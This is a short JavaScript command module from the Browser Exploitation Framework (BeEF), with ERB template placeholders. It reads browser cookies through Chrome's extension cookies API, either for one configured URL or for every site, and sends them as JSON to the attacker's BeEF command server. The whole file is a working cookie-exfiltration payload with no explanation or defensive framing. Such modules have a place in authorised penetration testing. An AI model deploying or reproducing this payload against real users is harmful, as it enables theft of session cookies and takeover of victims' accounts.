//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	the_url = "<%== @url %>";
	if (the_url != 'default_all') {
	    chrome.cookies.getAll({url:the_url}, function(cookies){
	        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
	    })
	} else {
		chrome.cookies.getAll({}, function(cookies){
        	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'cookies: ' + JSON.stringify(cookies));
    	})
	}

});

